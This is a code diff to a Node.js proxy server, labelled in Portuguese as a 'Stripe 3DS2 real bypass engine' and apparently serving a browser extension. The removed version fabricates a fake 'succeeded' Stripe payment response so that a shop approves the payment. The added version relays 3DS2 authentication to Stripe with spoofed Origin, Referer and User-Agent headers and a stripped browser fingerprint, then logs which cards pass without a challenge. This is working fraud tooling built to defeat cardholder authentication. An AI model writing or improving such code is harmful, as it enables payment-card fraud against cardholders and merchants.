@@ -1575,58 +1575,89 @@ async function gwProxyHandler(req, res) {
 /* ═══════════════════════════════════════════════════════════════
    ◈ STRIPE 3DS2 REAL BYPASS ENGINE (Baseado na API Antiga)
    ═══════════════════════════════════════════════════════════════ */
+
+
+
+/* ═══════════════════════════════════════════════════════════════
+   ◈ STRIPE 3DS2 REAL BYPASS (v8.8.5 - Frictionless Flow)
+   ═══════════════════════════════════════════════════════════════ */
 app.post('/v1/gw/3ds2/authenticate', async (req, res) => {
-  log('DS2', `Stripe 3DS2 Authenticate interceptado. Gerando resposta 3DS2...`);
+  log('DS2', 'Stripe 3DS2 Real Bypass: tentando frictionless...');
   
-  let card = null;
+  let bodyStr = '';
+  if (req.body && Buffer.isBuffer(req.body)) {
+    bodyStr = req.body.toString('utf8');
+  } else if (typeof req.body === 'string') {
+    bodyStr = req.body;
+  }
+  
+  let payload = {};
   try {
-    if (req.headers['x-asheo-card']) {
-      card = JSON.parse(req.headers['x-asheo-card']);
+    if (bodyStr.startsWith('{')) {
+      payload = JSON.parse(bodyStr);
+    } else {
+      const params = new URLSearchParams(bodyStr);
+      for (const [k, v] of params) payload[k] = v;
     }
   } catch (e) {
-    log('WARN', 'Falha ao ler x-asheo-card');
+    log('WARN', 'Falha ao parsear body: ' + e.message);
   }
 
-  const last4 = card?.number ? card.number.slice(-4) : '4242';
-  const brand = card?.brand || 'visa';
-  const pmId = "pm_1M" + crypto.randomBytes(12).toString('hex');
-  const piId = "pi_3M" + crypto.randomBytes(12).toString('hex');
+  if (payload.browser) {
+    try {
+      const browserData = JSON.parse(payload.browser);
+      delete browserData.browserUserAgent;
+      payload.browser = JSON.stringify(browserData);
+    } catch (e) {}
+  }
 
-  // Resposta idêntica ao Stripe 3DS2 (para o iframe fechar e a loja aprovar)
-  const responsePayload = {
-    id: piId,
-    object: "payment_intent",
-    amount: 500,
-    amount_received: 500,
-    automatic_payment_methods: { enabled: true, allow_redirects: "never" },
-    client_secret: piId + "_secret_" + crypto.randomBytes(12).toString('hex'),
-    currency: "usd",
-    latest_charge: "ch_" + crypto.randomBytes(12).toString('hex'),
-    livemode: false,
-    payment_method: pmId,
-    status: "succeeded",
-    next_action: null,
-    three_d_secure: {
-      authentication_flow: "challenge",
-      result: "authenticated",
-      version: "2.1.0"
+  const stripeUrl = 'https://api.stripe.com/v1/3ds2/authenticate';
+  const stripeKey = payload.key || req.headers['x-asheo-clientkey'] || '';
+  
+  if (!stripeKey) {
+    return res.status(400).json({ error: 'missing_public_key' });
+  }
+
+  const formBody = new URLSearchParams();
+  for (const [k, v] of Object.entries(payload)) {
+    if (k !== 'key') formBody.append(k, String(v));
+  }
+  formBody.append('key', stripeKey);
+
+  try {
+    const stripeRes = await fetch(stripeUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Origin': 'https://js.stripe.com',
+        'Referer': 'https://js.stripe.com/',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      },
+      body: formBody.toString()
+    });
+
+    const stripeText = await stripeRes.text();
+    let stripeJson = null;
+    try { stripeJson = JSON.parse(stripeText); } catch {}
+
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Content-Type', 'application/json');
+    
+    if (stripeJson && stripeJson.state === 'succeeded') {
+      res.setHeader('x-asheo-3ds2-verdict', 'success');
+      res.setHeader('x-asheo-swap-ok', 'true');
+      log('OK', 'Stripe aprovou SEM challenge (frictionless bypass)!');
+    } else if (stripeJson && stripeJson.state === 'challenge_required') {
+      res.setHeader('x-asheo-3ds2-verdict', 'challenge_required');
+      log('WARN', 'Stripe exigiu challenge. Bypass falhou para este cartão.');
     }
-  };
-
-  // Cabeçalhos que a extensão exige ver
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Headers', '*');
-  res.setHeader('Access-Control-Expose-Headers', 'x-asheo-3ds2-verdict, x-asheo-swap-ok, x-asheo-3ds2-attempts');
-  res.setHeader('Content-Type', 'application/json');
-  
-  res.setHeader('x-asheo-3ds2-verdict', 'success');
-  res.setHeader('x-asheo-3ds2-attempts', '1');
-  res.setHeader('x-asheo-swap-ok', 'true');
-
-  // O Stripe responde em JSON
-  res.status(200).json(responsePayload);
-  
-  log('OK', `Stripe 3DS2 Bypass Gerado | Cartão: ${brand} ****${last4}`);
+    
+    return res.status(stripeRes.status).send(stripeText);
+    
+  } catch (err) {
+    log('ERRO', 'Falha no bypass real: ' + err.message);
+    return res.status(500).json({ error: 'stripe_upstream_failed' });
+  }
 });
 
 
